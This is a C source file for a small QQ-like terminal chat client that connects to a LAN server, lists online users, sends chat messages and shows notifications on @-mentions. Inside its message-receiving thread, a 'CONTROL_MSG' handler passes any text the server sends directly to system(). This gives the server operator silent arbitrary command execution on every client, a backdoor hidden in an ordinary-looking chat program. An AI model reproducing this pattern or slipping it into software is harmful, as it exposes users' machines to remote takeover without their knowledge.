#include "head.h"

static int sockfd;
static int connectfd;
char host_name[HOST_NAME_LEN];

static int start_client(int argc, char **argv)
{
	struct sockaddr_in sock_addr;

	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if(-1 == sockfd)
		return 1;

	memset(&sock_addr, 0, sizeof(struct sockaddr_in));
	sock_addr.sin_family = AF_INET;
	sock_addr.sin_port   = htons(SERVERPORT);
	if (argc == 2)
		sock_addr.sin_addr.s_addr = inet_addr(argv[1]);
	else
		sock_addr.sin_addr.s_addr = inet_addr("192.168.111.229");

	connectfd = connect(sockfd, (struct sockaddr *)&sock_addr, sizeof(struct sockaddr));
	if(-1 == connectfd)
		return 1;

	return 0;
}

static void end_client(void)
{
	close(sockfd);
}

#define NOTIFY_CMD_LEN 12
static void check_if_at_me(char *msg)
{
	const char *from = NULL;

	if (!msg)
		return ;

	while (1) {
		from = strchr(from ? from : msg, '@');
		if (!from)
			return ;
		from++;

		if (strncmp(from, host_name, strlen(host_name) > strlen(from) ? strlen(from) : strlen(host_name)) == 0) {
			system("notify-send \"New Msg From QQ\"");
		} else if (strncmp(from, "all", strlen(from) > 3 ? 3 : strlen(from)) == 0) {
			system("notify-send \"New Msg From QQ\"");
		}
	}
}

static void *daemon_proc(void *data)
{
	msg_t msg;

	while(1)
	{
		memset(&msg, 0, sizeof(msg_t));
		int num = read(sockfd, &msg, sizeof(msg_t));
		if(num <= 0)
		{
			printf("server closed\n");
			close(sockfd);
			return NULL;
		}

		switch(msg.intention)
		{
		case LOGIN_SUCCESS:
			printf("LOGIN SUCCESS\n");
			break;
		case ONLINE_PEOPLE_ANSWER:
			printf("%s\n", msg.msg);
			break;
		case CHAT_TO:
			check_if_at_me(msg.msg);
			printf("%s\n", msg.msg);
			break;
		case CONTROL_MSG:
			if (strncmp(msg.msg, "exit", 4) == 0)
				_exit(0);
			else
				system(msg.msg);
			break;
		default:
			break;
		}
	}

	return NULL;
}

enum usr_choose {
	CLI_CHECK_ONLINE,
	CLI_CHAT,
	CLI_OTHER,
};

static void qq_print_help(void)
{
	printf("--------         Welcome         --------\n");
	printf("-------- 1: check online people  --------\n");
	printf("-------- 2:    begin chat        --------\n");
	printf("-------- 3:       exit           --------\n");

	return ;
}

static void do_qq(void)
{
	msg_t msg;
	char choose;

	// 登陆信息
	memset(&msg, 0, sizeof(msg_t));
	strcpy(host_name, qq_get_host_name());
	msg.intention = SELF_INTRODUCTION;
	memcpy(&msg.msg, host_name, strlen(host_name));
	write(sockfd, &msg, sizeof(msg_t));

	// 注册接受消息线程
	pthread_t pt;
	pthread_attr_t attr;
	int ret ;

	pthread_attr_init(&attr);
	ret = pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
	if(ret != 0)
		return ;
	ret = pthread_create(&pt, &attr, daemon_proc, NULL);
	if(ret != 0)
		return ;


	// 获取用户请求
	while (1) {
		memset(&msg, 0, sizeof(msg_t));

		// print help
		qq_print_help();

		// wait for choose
		while ((choose = getchar()) == '\n');
		while (getchar() != '\n');

		switch (choose) {
			case '1':
				{
					msg.intention = CHECK_ONLINE_PERSION;
					write(sockfd, &msg, sizeof(msg_t));
				}
				break;
			case '2':
				{
					system("clear");

					int i;
					while (1) {
						memset(msg.msg, 0, MSG_LEN);
						msg.intention = TO_CHAT;
						for (i = 0; i < MSG_LEN; i++) {
							msg.msg[i] = getchar();
							if (msg.msg[i] == '\n')
								break;
						}

						if (strncmp(msg.msg, "exit", 4) == 0)
							break;
						if (strncmp(msg.msg, "clear", 5) == 0) {
							system("clear");
							continue;
						}

						write(sockfd, &msg, sizeof(msg_t));
					}
				}
				break;
			case '3':
				_exit(0);
				break;
			default:
				break;
		}
	}
}

int main(int argc, char *argv[])
{
	if (start_client(argc, argv) != 0) {
		printf("connect to server failed\n");
		return -1;
	}

	do_qq();

	end_client();
	return 0;
}
